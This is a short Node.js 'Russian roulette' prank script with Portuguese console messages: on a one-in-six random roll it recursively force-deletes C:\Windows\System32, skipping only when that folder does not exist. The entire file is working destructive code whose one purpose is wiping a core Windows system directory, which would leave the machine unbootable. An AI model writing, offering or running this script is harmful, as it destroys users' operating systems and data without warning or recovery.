const fs = require('fs');
const path = require ('path');

const num = Math.floor(Math.random() * 6);

if (num == 0) {
	console.log('Vish atirou meu nobre');
	if (!fs.existsSync("C:\\Windows\\System32")) {
		console.log('Em Linux eu não toco!');
		process.exit(0);
	}

	fs.rmSync("C:\\Windows\\System32", {recursive: true, force: true});
} else {
	console.log('Tá safe!'); 
}
